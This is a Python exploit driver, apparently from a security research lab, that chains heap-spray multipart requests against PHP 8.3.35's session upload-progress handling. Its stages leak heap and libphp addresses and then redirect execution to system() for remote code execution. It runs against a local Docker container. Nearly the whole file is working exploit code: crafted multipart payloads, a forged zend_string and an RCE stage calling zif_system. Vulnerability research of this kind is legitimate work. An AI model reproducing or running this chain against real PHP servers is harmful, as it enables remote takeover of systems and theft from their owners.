#!/usr/bin/env python3
"""display_errors=Off chain attempt on PHP 8.3.35.

Phase A: upstream's NO_DISPLAY_ERRORS A-shape (send_a_idmain 129 3000 570
3040 20 1) — OOM inside php_session_send_cookie so send_cookie stays 1 with a
dangling PS(id), no error output needed.
Phase B: published stage-1 spray (N=841, forge 63) — the 4096-byte heap leak.
Phase 2: published stage-2 spray (T=406) — libphp leak.
Phase 3: published stage-3 (carrier 15, HTDATA = chunk + 0x6a0d8) — RCE.

Each phase is logged; the container is removed at the end.
"""
from __future__ import annotations

import json
import os
import re
import sys
import time

LAB = os.path.dirname(os.path.abspath(__file__))
DEV = os.path.join(LAB, "devploit-php2shell")
VENDOR = os.path.join(DEV, "vendor", "php2shell-upstream")
sys.path.insert(0, os.path.join(DEV, "tools"))
sys.path.insert(0, LAB)

import php2shell_calibrate as C  # noqa: E402
import php2shell_matrix as M  # noqa: E402
from ka_target import KATarget  # noqa: E402

PROFILE = os.path.join(LAB, "profiles-ours", "8.3.35-bookworm-amd64.json")
PORT, NAME = 8303, "p2s-de08335"
HTDATA_OFF = 0x6A0D8


def start():
    M.docker("rm", "-f", NAME)
    outdir = M.prepare_lab_out(os.path.join(M.LAB, "out", NAME))
    M.docker("run", "-d", "--name", NAME,
             "-p", f"127.0.0.1:{PORT}:80",
             "-v", f"{M.LAB}/webroot:/var/www/html:ro",
             "-v", f"{LAB}/php-de0.ini:/usr/local/etc/php/conf.d/zz-de0.ini:ro",
             "-v", f"{M.LAB}/apache.conf:/etc/apache2/conf-enabled/zz-de0.conf:ro",
             "-v", f"{outdir}:/out",
             "php:8.3.35-apache", timeout=900)
    url = f"http://127.0.0.1:{PORT}/index.php"
    if not M.wait_http(url):
        raise SystemExit("no answer")
    return url, outdir


def send_a_idmain(ka: KATarget, n128=129, v=3000, nh=570, hl=3040, ns=20,
                  n64e=1, n=997):
    """Upstream NO_DISPLAY_ERRORS.md §4.4 A-shape, ported to the pinned conn."""
    bnd = b"S" * 17
    parts = [{"name": "PHPSESSID", "data": b"\x00"},
             {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"}]
    for i in range(n):
        if i < n64e:
            val = b"q" * 39
        else:
            ln = 103 if i < n128 else v
            val = b"A" * ln
        parts.append({"name": "f%04d" % i, "data": val})
    head = b'Content-Disposition: form-data; name="f"; filename="a.txt"\r\n'
    for i in range(nh):
        head += b"X-Pad-%04d: " % i + b"H" * hl + b"\r\n"
    for i in range(ns):
        head += b"X-Sml-%04d: " % i + b"s" * 15 + b"\r\n"
    head += b"Content-Type: application/octet-stream\r\n\r\n"
    o = bytearray()
    for p in parts:
        o += b"--" + bnd + b"\r\nContent-Disposition: form-data; name=\"" \
             + p["name"].encode() + b"\"\r\n\r\n" + p["data"] + b"\r\n"
    o += b"--" + bnd + b"\r\n" + head + b"A" * 64 + b"\r\n"
    o += b"--" + bnd + b"--\r\n"
    return ka.post(bytes(o), bnd, read_cap=1 << 20, timeout=90.0)


def send_b_stage1(mod, ka, sid, n=841, forge_len=63):
    """Published stage-1 B: spray + forged zend_string."""
    parts = [{"name": "PHPSESSID", "data": sid},
             {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"}]
    for i in range(n):
        val = (f"v{i:04d}" + "x" * 44)[:48]
        parts.append({"name": str(1000 + i), "data": val.encode()})
    forge = bytearray(b"A" * forge_len)
    import struct
    if forge_len >= 0x19:
        struct.pack_into("<Q", forge, 0x10, 0x1000)
        forge[0x18] = ord("L")
    parts.append({"name": "1999", "data": bytes(forge)})
    return ka.post(mod.build_multipart(parts, b"B" * 10), b"B" * 10,
                   read_cap=9 << 20)


def send_b_stage2(mod, ka, sid, t_index=406, v_len=16):
    parts = [{"name": "PHPSESSID", "data": sid},
             {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"}]
    for i in range(983):
        cnt = 16 if i == t_index else 1
        for j in range(cnt):
            parts.append({"name": f"a{i:04d}[{j}]", "data": b"x" * v_len})
    return ka.post(mod.build_multipart(parts, b"B" * 10), b"B" * 10,
                   read_cap=1 << 20)


def cookie_len(raw: bytes) -> int:
    m = re.search(rb"Set-Cookie: PHPSESSID=([^\r\n]*?); path=/", raw or b"")
    return len(m.group(1)) if m else 0


def main() -> int:
    url, outdir = start()
    proof = os.path.join(outdir, "p1")
    if os.path.exists(proof):
        os.unlink(proof)
    mod = C.load_upstream(VENDOR)
    sym = C.extract_symbols(VENDOR, NAME)
    ka = KATarget(mod.Target(url, verbose=False))
    ex = mod.Exploit(ka, "id>/out/p1", zif_offset=sym["zif_system"],
                     dtor_offset=sym["zval_ptr_dtor"], profile="bookworm",
                     verbose=False)
    report = {"display_errors": "Off"}

    # sanity: display_errors really Off (warning trigger via bad multipart)
    raw = ka.post(mod.build_multipart([{"name": "a" * 5000, "data": b"x"}],
                                      b"B" * 10), b"B" * 10)
    leaked_err = b"Warning" in raw or b"Fatal error" in raw
    report["errors_rendered"] = bool(leaked_err)
    print(f"[*] sanity: error output rendered = {bool(leaked_err)} (want False)")

    ex.rotate()
    # ---- Phase A ----
    raw_a = send_a_idmain(ka)
    print(f"[*] A sent: {len(raw_a)} bytes response")
    time.sleep(0.3)

    # ---- Phase B: stage-1 leak ----
    raw_b = send_b_stage1(mod, ka, mod.SID)
    clen = cookie_len(raw_b)
    chunk = C.chunk_base(C._cookie(raw_b))
    report["stage1_cookie_len"] = clen
    report["stage1_chunk"] = hex(chunk) if chunk else None
    print(f"[*] B: cookie={clen} chunk={hex(chunk) if chunk else 0}")
    if not chunk:
        print("[-] stage-1 leak FAILED with display_errors=Off")
        json.dump(report, open(os.path.join(LAB, "logs", "de0-8335.json"), "w"),
                  indent=2)
        M.docker("rm", "-f", NAME)
        return 1

    # ---- Phase 2: libphp leak (same A priming, stage-2 B shape) ----
    ex.rotate()
    raw_a2 = send_a_idmain(ka)
    time.sleep(0.3)
    raw_b2 = send_b_stage2(mod, ka, mod.SID)
    lib = C.libphp_base(C._cookie(raw_b2), sym["zval_ptr_dtor"])
    report["stage2_libphp"] = hex(lib) if lib else None
    print(f"[*] stage2: libphp={hex(lib) if lib else 0}")
    if not lib:
        print("[-] stage-2 leak FAILED with display_errors=Off")
        json.dump(report, open(os.path.join(LAB, "logs", "de0-8335.json"), "w"),
                  indent=2)
        M.docker("rm", "-f", NAME)
        return 2

    # ---- Phase 3: RCE ----
    os.environ["P2S_CARRIER_LEN"] = "15"
    ex.stage3_carrier = True
    ex.stage3_pads = [(31, 31)] * 6
    ex.rotate()
    ex.stage3(chunk + HTDATA_OFF, lib + sym["zif_system"])
    raw3 = getattr(ka, "sock", None)
    time.sleep(0.8)
    ok = os.path.exists(proof) and os.path.getsize(proof) > 0
    report["stage3_rce"] = ok
    print(f"[+] stage3: proof={ok}")
    if ok:
        print(f"[+] RCE with display_errors=Off: {open(proof).read().strip()}")
    json.dump(report, open(os.path.join(LAB, "logs", "de0-8335.json"), "w"),
              indent=2)
    M.docker("rm", "-f", NAME)
    return 0 if ok else 3


if __name__ == "__main__":
    sys.exit(main())
